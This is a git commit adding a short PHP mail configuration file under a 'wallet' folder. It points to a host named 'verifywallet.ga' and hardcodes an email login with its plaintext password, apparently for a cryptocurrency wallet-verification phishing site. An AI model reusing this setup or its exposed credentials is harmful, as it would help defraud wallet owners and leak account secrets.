745c80c6fe69c6eb29fa4012db61c6073335005b
Dreadox <Serketbro@gmail.com>
2022-04-14 23:26:27 +0300

    config.php

---
+++ wallet/config.php
@@ -0,0 +1,13 @@
+<?php
+
+$host = 'verifywallet.ga';  // the domain name .com without https://
+
+$username = 'verifywalletglobal@gmail.com'; //username of the email account
+
+$password = 'Elmaspula96'; //password of the email account
+
+$setform = 'verifywalletglobal@gmail.com'; //email that is mail is sending from
+    (same as the username);
+
+
+?>
